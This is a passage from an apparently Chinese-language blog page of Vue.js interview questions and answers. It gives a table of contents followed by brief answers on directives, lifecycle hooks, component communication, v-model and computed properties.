<p id="46.computed%E3%80%81watch%EF%BC%88%E8%87%AA%E5%8A%A8%E7%9B%91%E5%90%AC%E3%80%81%E6%B7%B1%E5%BA%A6%E7%9B%91%E5%90%AC%EF%BC%89%E3%80%81methods%E5%8C%BA%E5%88%AB-toc" style="margin-left:40px"><a href="#46.computed%E3%80%81watch%EF%BC%88%E8%87%AA%E5%8A%A8%E7%9B%91%E5%90%AC%E3%80%81%E6%B7%B1%E5%BA%A6%E7%9B%91%E5%90%AC%EF%BC%89%E3%80%81methods%E5%8C%BA%E5%88%AB">46.computed、watch（自动监听、深度监听）、methods区别</a></p> 
<p id="47.vue%E4%B8%AD%E5%AF%B9%E8%B1%A1%E6%9B%B4%E6%94%B9%E6%A3%80%E6%B5%8B%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-toc" style="margin-left:40px"><a href="#47.vue%E4%B8%AD%E5%AF%B9%E8%B1%A1%E6%9B%B4%E6%94%B9%E6%A3%80%E6%B5%8B%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">47.vue中对象更改检测的注意事项</a></p> 
<p id="48.%E4%BB%80%E4%B9%88%E6%98%AF%24nextTick%EF%BC%9F-toc" style="margin-left:40px"><a href="#48.%E4%BB%80%E4%B9%88%E6%98%AF%24nextTick%EF%BC%9F">48.什么是$nextTick？</a></p> 
<p id="49.ref%20%E7%9A%84%E4%BD%9C%E7%94%A8%EF%BC%9F-toc" style="margin-left:40px"><a href="#49.ref%20%E7%9A%84%E4%BD%9C%E7%94%A8%EF%BC%9F">49.ref 的作用？</a></p> 
<p id="50.%E4%BB%80%E4%B9%88%E6%98%AFvuex%EF%BC%9Fvuex%E6%A0%B8%E5%BF%83%E5%8C%85%E6%8B%AC%EF%BC%9F%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9state%E4%B8%AD%E6%95%B0%E6%8D%AE%EF%BC%9F%E5%9C%A8%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%93%AA%E9%87%8C%E4%BD%BF%E7%94%A8%EF%BC%9F-toc" style="margin-left:40px"><a href="#50.%E4%BB%80%E4%B9%88%E6%98%AFvuex%EF%BC%9Fvuex%E6%A0%B8%E5%BF%83%E5%8C%85%E6%8B%AC%EF%BC%9F%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9state%E4%B8%AD%E6%95%B0%E6%8D%AE%EF%BC%9F%E5%9C%A8%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%93%AA%E9%87%8C%E4%BD%BF%E7%94%A8%EF%BC%9F">50.什么是vuex？vuex核心包括？怎么修改state中数据？在项目中哪里使用？</a></p> 
<p id="51.%E8%B7%AF%E7%94%B1%E6%A8%A1%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F%E8%B7%AF%E7%94%B1%E4%BC%A0%E5%8F%82%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E5%BC%8F%EF%BC%9F%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%8C%E6%9C%89%E6%B2%A1%E6%9C%89%E5%9C%A8%E9%A1%B9%E7%9B%AE%E4%B8%AD%E4%BD%BF%E7%94%A8%E8%BF%87%EF%BC%9F-toc" style="margin-left:40px"><a href="#51.%E8%B7%AF%E7%94%B1%E6%A8%A1%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F%E8%B7%AF%E7%94%B1%E4%BC%A0%E5%8F%82%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E5%BC%8F%EF%BC%9F%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%8C%E6%9C%89%E6%B2%A1%E6%9C%89%E5%9C%A8%E9%A1%B9%E7%9B%AE%E4%B8%AD%E4%BD%BF%E7%94%A8%E8%BF%87%EF%BC%9F">51.路由模式有哪些？路由传参有哪些方式？路由守卫有哪些，有没有在项目中使用过？</a></p> 
<p id="52.vue%E8%BF%87%E6%BB%A4%E5%99%A8-toc" style="margin-left:40px"><a href="#52.vue%E8%BF%87%E6%BB%A4%E5%99%A8">52.vue过滤器</a></p> 
<p id="1.%20%E5%85%A8%E5%B1%80%E8%BF%87%E6%BB%A4%E5%99%A8%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0-toc" style="margin-left:80px"><a href="#1.%20%E5%85%A8%E5%B1%80%E8%BF%87%E6%BB%A4%E5%99%A8%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0">1. 全局过滤器                                                         </a></p> 
<p id="2.%E5%B1%80%E9%83%A8%E8%BF%87%E6%BB%A4%E5%99%A8-toc" style="margin-left:80px"><a href="#2.%E5%B1%80%E9%83%A8%E8%BF%87%E6%BB%A4%E5%99%A8">2.局部过滤器</a></p> 
<p id="53.%E6%9C%89%E6%B2%A1%E6%9C%89%E5%B0%81%E8%A3%85%E8%BF%87%E7%BB%84%E4%BB%B6%EF%BC%8C%E5%B0%81%E8%A3%85%E8%BF%87%E4%BB%80%E4%B9%88%EF%BC%8C%E6%80%8E%E4%B9%88%E5%B0%81%E8%A3%85%EF%BC%9F%E6%B3%A8%E6%84%8F%E7%82%B9%E6%88%96%E6%9C%89%E5%93%AA%E4%BA%9B%E5%8E%9F%E5%88%99%EF%BC%9F-toc" style="margin-left:40px"><a href="#53.%E6%9C%89%E6%B2%A1%E6%9C%89%E5%B0%81%E8%A3%85%E8%BF%87%E7%BB%84%E4%BB%B6%EF%BC%8C%E5%B0%81%E8%A3%85%E8%BF%87%E4%BB%80%E4%B9%88%EF%BC%8C%E6%80%8E%E4%B9%88%E5%B0%81%E8%A3%85%EF%BC%9F%E6%B3%A8%E6%84%8F%E7%82%B9%E6%88%96%E6%9C%89%E5%93%AA%E4%BA%9B%E5%8E%9F%E5%88%99%EF%BC%9F">53.有没有封装过组件，封装过什么，怎么封装？注意点或有哪些原则？</a></p> 
<p id="55.%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8%E8%BF%87axios%E3%80%81axios%E6%8B%A6%E6%88%AA%E5%99%A8%EF%BC%8C%E8%B7%A8%E5%9F%9F%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F-toc" style="margin-left:40px"><a href="#55.%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8%E8%BF%87axios%E3%80%81axios%E6%8B%A6%E6%88%AA%E5%99%A8%EF%BC%8C%E8%B7%A8%E5%9F%9F%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F">55.有没有使用过axios、axios拦截器，跨域如何解决？</a></p> 
<p id="56.vue%E9%A1%B9%E7%9B%AE%E5%81%9A%E8%BF%87%E5%93%AA%E4%BA%9B%E4%BC%98%E5%8C%96-toc" style="margin-left:40px"><a href="#56.vue%E9%A1%B9%E7%9B%AE%E5%81%9A%E8%BF%87%E5%93%AA%E4%BA%9B%E4%BC%98%E5%8C%96">56.vue项目做过哪些优化</a></p> 
<p id="57.%E4%B8%BA%E4%BB%80%E4%B9%88%E5%81%9A%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96%EF%BC%9F-toc" style="margin-left:40px"><a href="#57.%E4%B8%BA%E4%BB%80%E4%B9%88%E5%81%9A%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96%EF%BC%9F">57.为什么做首屏优化？</a></p> 
<p id="58.%E5%A6%82%E4%BD%95%E5%81%9A%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96%EF%BC%9F-toc" style="margin-left:40px"><a href="#58.%E5%A6%82%E4%BD%95%E5%81%9A%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96%EF%BC%9F">58.如何做首屏优化？</a></p> 
<p id="60.v-on%E5%8F%AF%E4%BB%A5%E7%9B%91%E5%90%AC%E5%A4%9A%E4%B8%AA%E6%96%B9%E6%B3%95%E5%90%97%EF%BC%9F-toc" style="margin-left:40px"><a href="#60.v-on%E5%8F%AF%E4%BB%A5%E7%9B%91%E5%90%AC%E5%A4%9A%E4%B8%AA%E6%96%B9%E6%B3%95%E5%90%97%EF%BC%9F">60.v-on可以监听多个方法吗？</a></p> 
<p id="61.vue%E4%B8%AD%E7%BC%96%E5%86%99%E5%8F%AF%E5%A4%8D%E7%94%A8%E7%9A%84%E7%BB%84%E4%BB%B6(%E6%B7%B1%E5%BA%A6%E5%A5%BD%E9%A2%98%EF%BC%8C%E6%8E%8C%E6%8F%A1%E6%80%9D%E8%B7%AF%2C%E4%B8%8D%E7%94%A8%E8%83%8C%E8%AF%B5)-toc" style="margin-left:40px"><a href="#61.vue%E4%B8%AD%E7%BC%96%E5%86%99%E5%8F%AF%E5%A4%8D%E7%94%A8%E7%9A%84%E7%BB%84%E4%BB%B6%28%E6%B7%B1%E5%BA%A6%E5%A5%BD%E9%A2%98%EF%BC%8C%E6%8E%8C%E6%8F%A1%E6%80%9D%E8%B7%AF%2C%E4%B8%8D%E7%94%A8%E8%83%8C%E8%AF%B5%29">61.vue中编写可复用的组件(深度好题，掌握思路,不用背诵)</a></p> 
<p id="62.vue%E5%A6%82%E4%BD%95%E7%9B%91%E5%90%AC%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6%E4%B8%AD%E7%9A%84%E6%8C%89%E9%94%AE%EF%BC%9F%EF%BC%88%E5%A4%A7%E5%A3%B0%E6%9C%97%E8%AF%BB2%E9%81%8D%EF%BC%89-toc" style="margin-left:40px"><a href="#62.vue%E5%A6%82%E4%BD%95%E7%9B%91%E5%90%AC%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6%E4%B8%AD%E7%9A%84%E6%8C%89%E9%94%AE%EF%BC%9F%EF%BC%88%E5%A4%A7%E5%A3%B0%E6%9C%97%E8%AF%BB2%E9%81%8D%EF%BC%89">62.vue如何监听键盘事件中的按键？（大声朗读2遍）</a></p> 
<p id="64.v-for%E4%BA%A7%E7%94%9F%E7%9A%84%E5%88%97%E8%A1%A8%EF%BC%8C%E5%AE%9E%E7%8E%B0active%E7%9A%84%E5%88%87%E6%8D%A2%20tab%E5%88%87%E6%8D%A2-toc" style="margin-left:40px"><a href="#64.v-for%E4%BA%A7%E7%94%9F%E7%9A%84%E5%88%97%E8%A1%A8%EF%BC%8C%E5%AE%9E%E7%8E%B0active%E7%9A%84%E5%88%87%E6%8D%A2%20tab%E5%88%87%E6%8D%A2">64.v-for产生的列表，实现active的切换 tab切换</a></p> 
<p id="65.v-model%E8%AF%AD%E6%B3%95%E7%B3%96%E4%BD%BF%E7%94%A8-toc" style="margin-left:40px"><a href="#65.v-model%E8%AF%AD%E6%B3%95%E7%B3%96%E4%BD%BF%E7%94%A8">65.v-model语法糖使用</a></p> 
<p id="66.%E5%8D%81%E4%B8%AA%E5%B8%B8%E7%94%A8%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4%E5%99%A8-toc" style="margin-left:40px"><a href="#66.%E5%8D%81%E4%B8%AA%E5%B8%B8%E7%94%A8%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4%E5%99%A8">66.十个常用的自定义过滤器</a></p> 
<p id="67.vue%E7%AD%89%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8%E5%8F%8A%E5%85%B6%E4%BC%98%E7%BC%BA%E7%82%B9-toc" style="margin-left:40px"><a href="#67.vue%E7%AD%89%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8%E5%8F%8A%E5%85%B6%E4%BC%98%E7%BC%BA%E7%82%B9">67.vue等单页面应用及其优缺点</a></p> 
<p id="68.vue%E7%9A%84%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%EF%BC%8C%E7%89%B9%E6%80%A7%EF%BC%8C%E5%BA%94%E7%94%A8-toc" style="margin-left:40px"><a href="#68.vue%E7%9A%84%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%EF%BC%8C%E7%89%B9%E6%80%A7%EF%BC%8C%E5%BA%94%E7%94%A8">68.vue的计算属性，特性，应用</a></p> 
<p id="70.vue-cli%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8%E5%85%A8%E5%B1%80%E5%B8%B8%E9%87%8F(%E4%BA%86%E8%A7%A3)-toc" style="margin-left:40px"><a href="#70.vue-cli%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8%E5%85%A8%E5%B1%80%E5%B8%B8%E9%87%8F%28%E4%BA%86%E8%A7%A3%29">70.vue-cli生产环境使用全局常量(了解)</a></p> 
<p id="71.vue%E5%BC%B9%E7%AA%97%E5%90%8E%E5%A6%82%E4%BD%95%E7%A6%81%E6%AD%A2%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%BB%9A%E5%8A%A8%EF%BC%9F%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89-toc" style="margin-left:40px"><a href="#71.vue%E5%BC%B9%E7%AA%97%E5%90%8E%E5%A6%82%E4%BD%95%E7%A6%81%E6%AD%A2%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%BB%9A%E5%8A%A8%EF%BC%9F%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89">71.vue弹窗后如何禁止滚动条滚动？（了解）</a></p> 
<p id="72.vue-cli%E4%B8%AD%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8-toc" style="margin-left:40px"><a href="#72.vue-cli%E4%B8%AD%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8">72.vue-cli中自定义指令的使用</a></p> 
<p id="73.%E7%88%B6%E7%BB%84%E4%BB%B6%E5%BC%82%E6%AD%A5%E8%8E%B7%E5%8F%96%E5%8A%A8%E6%80%81%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6(%E5%A5%BD%E9%A2%98)-toc" style="margin-left:40px"><a href="#73.%E7%88%B6%E7%BB%84%E4%BB%B6%E5%BC%82%E6%AD%A5%E8%8E%B7%E5%8F%96%E5%8A%A8%E6%80%81%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6%28%E5%A5%BD%E9%A2%98%29">73.父组件异步获取动态数据传递给子组件(好题)</a></p> 
<p id="74.%E7%88%B6%E7%BB%84%E4%BB%B6%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6props%E4%BC%A0%E5%8F%82%EF%BC%8C%E5%AD%90%E7%BB%84%E4%BB%B6%E6%8E%A5%E6%94%B6%E7%9A%846%E7%A7%8D%E6%96%B9%E6%B3%95-toc" style="margin-left:40px"><a href="#74.%E7%88%B6%E7%BB%84%E4%BB%B6%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6props%E4%BC%A0%E5%8F%82%EF%BC%8C%E5%AD%90%E7%BB%84%E4%BB%B6%E6%8E%A5%E6%94%B6%E7%9A%846%E7%A7%8D%E6%96%B9%E6%B3%95">74.父组件给子组件props传参，子组件接收的6种方法</a></p> 
<p id="75.Vuex%E9%A1%B5%E9%9D%A2%E5%88%B7%E6%96%B0%E6%95%B0%E6%8D%AE%E4%B8%A2%E5%A4%B1%E5%92%8B%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AAbug-toc" style="margin-left:40px"><a href="#75.Vuex%E9%A1%B5%E9%9D%A2%E5%88%B7%E6%96%B0%E6%95%B0%E6%8D%AE%E4%B8%A2%E5%A4%B1%E5%92%8B%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AAbug">75.Vuex页面刷新数据丢失咋解决这个bug</a></p> 
<p id="%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF1%EF%BC%9A-toc" style="margin-left:80px"><a href="#%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF1%EF%BC%9A">解决思路1：</a></p> 
<p id="%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%952%3A-toc" style="margin-left:80px"><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%952%3A">解决方法2:</a></p> 
<p id="76.%E6%8C%89%E9%92%AE%E6%9D%83%E9%99%90%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%9F-toc" style="margin-left:40px"><a href="#76.%E6%8C%89%E9%92%AE%E6%9D%83%E9%99%90%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%9F">76.按钮权限怎么做？</a></p> 
<p id="77.%E5%AE%8C%E6%95%B4%E7%9A%84%E8%AF%B4%E4%B8%8B%E4%BB%8Eurl%E8%A7%A3%E6%9E%90%E5%88%B0%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E8%BF%87%E7%A8%8B%EF%BC%8C%E7%BB%93%E5%90%88%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%AF%B4-toc" style="margin-left:40px"><a href="#77.%E5%AE%8C%E6%95%B4%E7%9A%84%E8%AF%B4%E4%B8%8B%E4%BB%8Eurl%E8%A7%A3%E6%9E%90%E5%88%B0%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E8%BF%87%E7%A8%8B%EF%BC%8C%E7%BB%93%E5%90%88%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%AF%B4">77.完整的说下从url解析到显示页面过程，结合项目中说</a></p> 
<p id="78.vue%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9F%E9%83%BD%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%9C%BA%E6%99%AF%E4%B8%AD%E4%BD%BF%E7%94%A8%EF%BC%9F-toc" style="margin-left:40px"><a href="#78.vue%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9F%E9%83%BD%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%9C%BA%E6%99%AF%E4%B8%AD%E4%BD%BF%E7%94%A8%EF%BC%9F">78.vue声明周期都在哪些场景中使用？</a></p> 
<hr id="hr-toc">
<p></p> 
<h2 id="1.%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D" style="margin-left:.0001pt;text-align:left"><strong><span style="color:#333333"><strong>1.自我介绍</strong></span></strong></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">2分钟，200-300个字，主旨自己基本情况，工作经历，优点，兴趣爱好，职业规划，邀约</span></span></p> 
<h1 id="2.vue%E9%9D%A2%E8%AF%95%E9%A2%98" style="margin-left:.0001pt;text-align:left"><strong><span style="color:#333333"><strong>2.vue面试题</strong></span></strong></h1> 
<h2 id="1.v-show%E5%92%8Cv-if%E5%8C%BA%E5%88%AB%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9A" style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24">1.v-show和v-if区别的区别：</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-show通过css display控制显示和隐藏，v-if组件真正的渲染和销毁，而不是显示和隐藏，频繁切换状态使用v-show 否则v-if</span></span></p> 
<h2 id="2.%E4%B8%BA%E4%BD%95v-for%E8%A6%81%E7%94%A8key" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">2.为何v-for要用key</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">快速查找到节点，减少渲染次数，提升渲染性能</span></span></p> 
<h2 id="3.%E6%8F%8F%E8%BF%B0vue%E7%BB%84%E4%BB%B6%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9Fmm" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043">3.描述vue组件声明周期mm</span></h2> 
<h3 id="%E5%8D%95%E7%BB%84%E4%BB%B6%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9F%E5%9B%BE" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7"><span style="background-color:#f8f8f8">单组件声明周期图</span></span></h3> 
<p style="margin-left:.0001pt;text-align:left"><br><span style="background-color:#f8f8f8"><span style="color:#333333">挂载： beforeCreate =&gt; created =&gt; beforeMount =&gt; mounted</span><br><span style="color:#333333">更新： beforeUpdate =&gt; updated</span><br><span style="color:#333333">销毁： beforeDestroy =&gt; destroyed</span></span></p> 
<h3 id="%E2%80%8B%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE" style="margin-left:.0001pt;text-align:left">
<br><span style="background-color:#f8f8f8"><span style="color:#333333">​</span><br><span style="color:#956fe7">父子组件生命周期图</span></span>
</h3> 
<p style="margin-left:.0001pt;text-align:left"><br><span style="background-color:#f8f8f8"><span style="color:#333333">挂载： parent beforeCreate =&gt; parent created =&gt; parent beforeMount =&gt; child beforeCreate =&gt; child created =&gt; child beforeMount =&gt; child mounted =&gt; parent mounted</span><br><span style="color:#333333">更新： parent beforeUpdate =&gt; child beforeUpdate =&gt; child updated =&gt; parent updated</span><br><span style="color:#333333">销毁： parent beforeDestroy =&gt; child beforeDestroy =&gt; child destroyed =&gt; parent destroyed</span><br><span style="color:#333333">从以上能够看出：</span><br><span style="color:#333333">挂载时，子组件是在父组件before mount后开始挂载，并且子组件先mounted，父组件随后</span><br><span style="color:#333333">更新时，子组件是在父组件before update后开始更新，子组件先于父组件更新</span><br><span style="color:#333333">销毁时，子组件是在父组件before destroy后开始销毁，并且是子组件先销毁，父组件随后。</span></span></p> 
<h2 id="4.vue%E7%BB%84%E4%BB%B6%E5%A6%82%E4%BD%95%E9%80%9A%E4%BF%A1" style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24">4.vue组件如何通信</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">1.父子组件props和this.$emit</span><br><span style="color:#333333">2.ref 链：父组件要给子组件传值，在子组件上定义一个 ref 属性，这样通过父组件的 $refs 属性就可以获取子组件的值了，也可以进行父子，兄弟之间的传值($parent / $children与 ref类似)</span><br><span style="color:#333333">3.事件总线bus：使用一个 空的 VUE 实例作为事件总线，自定义事件event.$on   event.$off event.$emit</span><br><span style="color:#333333">4 provide inject组件通信</span><br><span style="color:#333333">5.vuex</span><br><span style="color:#333333">6.$attrs和$listeners 仅仅是传递数据，而不做中间处理，$attrs 里存放的是父组件中绑定的非 Props 属性，$listeners里存放的是父组件中绑定的非原生事件。</span><br><span style="color:#333333">​</span><br><span style="color:#333333">常见使用场景可以分为三类：</span><br><span style="color:#333333">父子通信：</span><br><span style="color:#333333">父向子传递数据是通过 props，子向父是通过 events（$emit）；</span><br><span style="color:#333333">通过父链 / 子链也可以通信（$parent / $children）；</span><br><span style="color:#333333">ref 也可以访问组件实例；</span><br><span style="color:#333333">provide / inject API；</span><br><span style="color:#333333">$attrs/$listeners</span><br><span style="color:#333333">vuex</span><br><span style="color:#333333">兄弟通信：</span><br><span style="color:#333333">事件总线Bus；</span><br><span style="color:#333333">Vuex</span><br><span style="color:#333333">跨级通信：</span><br><span style="color:#333333">事件总线Bus；</span><br><span style="color:#333333">Vuex；</span><br><span style="color:#333333">provide / inject API</span><br><span style="color:#333333">$attrs/$listeners</span></span></p> 
<h2 id="5.%E6%8F%8F%E8%BF%B0%E7%BB%84%E4%BB%B6%E6%B8%B2%E6%9F%93%E5%92%8C%E6%9B%B4%E6%96%B0%E7%9A%84%E8%BF%87%E7%A8%8B" style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24">5.描述组件渲染和更新的过程</span></h2> 
<h3 id="1%E3%80%81vue%20%E7%BB%84%E4%BB%B6%E5%88%9D%E6%AC%A1%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0"><span style="background-color:#f8f8f8">1、vue 组件初次渲染过程</span></span></h3> 
<p style="margin-left:.0001pt;text-align:left"><br><span style="background-color:#f8f8f8"><span style="color:#333333">解析模板为 render 函数</span><br><span style="color:#333333">触发响应式，监听 data 属性的 getter 和 setter</span><br><span style="color:#333333">执行 render 函数， 生成 vnode，patch(elem,vnode)</span></span></p> 
<h3 id="2%E3%80%81vue%20%E7%BB%84%E4%BB%B6%E6%9B%B4%E6%96%B0%E8%BF%87%E7%A8%8B" style="margin-left:.0001pt;text-align:left">
<br><span style="background-color:#f8f8f8"><span style="color:#956fe7">2、vue 组件更新过程</span></span>
</h3> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><br><span style="background-color:#f8f8f8"><span style="color:#333333">修改 data， 触发 setter （此前在getter中已被监听）</span><br><span style="color:#333333">重新执行 render 函数，生成 newVnode，patch(vnode, newVnode)</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<h2 id="6.%E5%8F%8C%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9Av-model%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86" style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24">6.双向数据绑定v-model的实现原理</span></h2> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">双向数据绑定最核心的方法便是通过Object.defineProperty()来实现对属性的劫持，达到监听数据变动的目的.</span><br><span style="color:#333333">​</span><br><span style="color:#333333">先是从data里面的数据msg通过绑定到input控件和p标签上。然后input上通过v-on:input监听控件，触发change()。</span><br><span style="color:#333333">调用方法都可以默认获取e事件，e.target.value是获取调用该方法的DOM对象的value值。把value值在赋给data里的msg，就是实现了双向数据绑定的原理了。</span><br><span style="color:#333333">​</span></span></p> 
<h2 id="7.%E5%AF%B9mvvm%E7%9A%84%E7%90%86%E8%A7%A3" style="margin-left:.0001pt;text-align:left"><span style="color:#ffd900">7.对mvvm的理解</span></h2> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">m-&gt;model,v-&gt;view,vm-&gt;viewModel。dom通过监听事件操作vue里的data，反之vue中的data通过指令操作dom，这就是所说数据驱动视图，这就是mvvm的理解。</span></span></p> 
<h2 id="8.computed%E6%9C%89%E4%BD%95%E7%89%B9%E6%80%A7" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">8.computed有何特性</span></h2> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">缓存，data不变不会重新计算，提高性能</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<h2 id="9.VUE%20%E4%B8%AD%E5%A6%82%E4%BD%95%E5%B0%81%E8%A3%85%E7%BB%84%E4%BB%B6%EF%BC%9F%E4%BB%80%E4%B9%88%E7%BB%84%E4%BB%B6%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%B0%81%E8%A3%85%E7%BB%84%E4%BB%B6%EF%BC%9F%E7%BB%84%E4%BB%B6%E4%B8%AD%20data%20%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">9.VUE 中如何封装组件？什么组件，为什么要封装组件？组件中 data 为什么是一个函数？</span></h2> 
<h3 id="%C2%A0%C2%A0%C2%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%B0%81%E8%A3%85%E7%BB%84%E4%BB%B6%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7"><span style="background-color:#f8f8f8">   为什么要封装组件？</span></span></h3> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　　主要就是为了解耦，提高代码复用率。</span></span></p> 
